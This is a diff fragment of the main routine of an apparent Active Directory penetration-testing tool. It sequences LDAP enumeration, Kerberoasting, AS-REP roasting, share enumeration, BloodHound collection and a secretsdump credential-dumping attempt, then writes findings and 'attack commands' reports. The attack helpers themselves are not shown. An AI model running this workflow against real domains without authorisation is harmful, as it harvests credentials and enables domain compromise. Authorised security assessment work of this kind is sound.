-        _warn("Some tools missing — continuing anyway, affected steps will be skipped.")
+    check_deps()
 
     cfg = wizard()
 
@@ -478,60 +486,41 @@ def main():
 
     raw = {}
 
-    _info("Starting LDAP enumeration...")
-    out = run_ldap_enum(cfg)
-    if out: raw["ldap_enum"] = out
+    out = run_ldap_enum(cfg);    raw["ldap_enum"]    = out if out.strip() else ""
+    out = run_kerberoast(cfg);   raw["kerberoast"]   = out if out.strip() else ""
+    out = run_asrep(cfg);        raw["asrep"]        = out if out.strip() else ""
+    out = run_shares(cfg);       raw["shares"]       = out if out.strip() else ""
+    out = run_passpol(cfg);      raw["passpol"]      = out if out.strip() else ""
+    out = run_bloodhound(cfg);   raw["bloodhound"]   = out if out.strip() else ""
 
-    _info("Starting Kerberoasting...")
-    out = run_kerberoast(cfg)
-    if out: raw["kerberoast"] = out
+    _warn("Attempting secretsdump (needs admin — fails silently if not)...")
+    out = run_secretsdump(cfg);  raw["secretsdump"]  = out if out.strip() else ""
 
-    _info("Starting AS-REP Roasting...")
-    out = run_asrep(cfg)
-    if out: raw["asrep"] = out
-
-    _info("Enumerating SMB shares...")
-    out = run_shares(cfg)
-    if out: raw["shares"] = out
-
-    _info("Checking password policy...")
-    out = run_passpol(cfg)
-    if out: raw["passpol"] = out
-
-    _info("Running BloodHound collection...")
-    out = run_bloodhound(cfg)
-    if out: raw["bloodhound"] = out
-
-    print()
-    _warn("Attempting secretsdump (will fail silently if not admin)...")
-    out = run_secretsdump(cfg)
-    if out: raw["secretsdump"] = out
+    # Remove empty keys
+    raw = {k: v for k, v in raw.items() if v}
 
     _section("PHASE 3 - Report Generation")
 
     findings = parse_results(raw)
     _ok(f"Parsed {len(findings)} finding(s).")
 
-    loot = collect_loot_kali(raw, cfg)
+    loot = collect_loot(raw, cfg)
 
-    config = {
-        "target": {"domain": cfg["domain"], "dc_ip": cfg["dc_ip"]},
-        "auth":   {"username": cfg["user"], "password": cfg["password"]},
-        "scope":  {"output_dir": cfg["out_dir"]},
-        "discovery": {
-            "internet": True,
-            "network": {"local_ip": "", "hostname": ""},
-            "user": {"username": cfg["user"]},
-        }
-    }
+    try:
+        r1, r2 = build_reports(findings, loot, raw, cfg)
+        _section("Done")
+        _ok(f"Report 1 (Findings):        {r1}")
+        _ok(f"Report 2 (Attack Commands): {r2}")
 
-    r1, r2, md = generate_all(findings, config, raw_outputs=raw)
-
-    _section("Done")
-    _ok(f"Report 1 (Findings):        {r1}")
-    _ok(f"Report 2 (Attack Commands): {r2}")
-    _ok(f"Combined Markdown:          {md}")
-    print(f"\n  {C.DIM}BloodHound ZIP (if collected): {cfg['raw_dir']}/*.zip{C.RESET}\n")
+        zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
+        if zips:
+            _ok(f"BloodHound ZIP:             {os.path.join(cfg['raw_dir'], zips[0])}")
+        else:
+            _warn("No BloodHound ZIP — check raw/bloodhound.log")
+        print()
+    except Exception:
+        _err("Report generation failed:")
+        traceback.print_exc()
 
 
 if __name__ == "__main__":
